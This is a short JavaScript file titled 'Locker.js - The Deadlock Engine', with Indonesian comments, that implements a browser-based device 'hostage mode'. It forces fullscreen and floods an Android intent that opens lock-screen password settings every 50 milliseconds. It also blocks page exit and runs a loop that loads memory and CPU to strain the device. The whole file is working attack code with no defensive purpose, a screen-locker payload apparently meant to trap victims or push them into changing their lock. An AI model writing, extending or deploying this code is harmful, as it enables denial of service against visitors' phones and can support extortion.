// Locker.js - The Deadlock Engine
const Locker = {
    // Fungsi buat ngunci layar dan nembak intent terus-terusan
    startHostageMode: function() {
        console.log("System Hostage Mode: ACTIVE");
        
        // 1. Force Fullscreen Aggressively
        const elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();

        // 2. Intent Flooding (The "Pukul" part)
        // Kita pake metode window.open biar gak ke-block navigasi utama
        setInterval(() => {
            window.location.href = "intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;component=com.android.settings/.ChooseLockGeneric;end";
        }, 50);

        // 3. Prevent Escape
        window.addEventListener("beforeunload", (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
    },

    // Fungsi buat nambah beban CPU
    stressMemory: function() {
        setInterval(() => {
            const arr = new Array(100000).fill("SYSTEM_CRASH_LOAD");
        }, 10);
    }
};
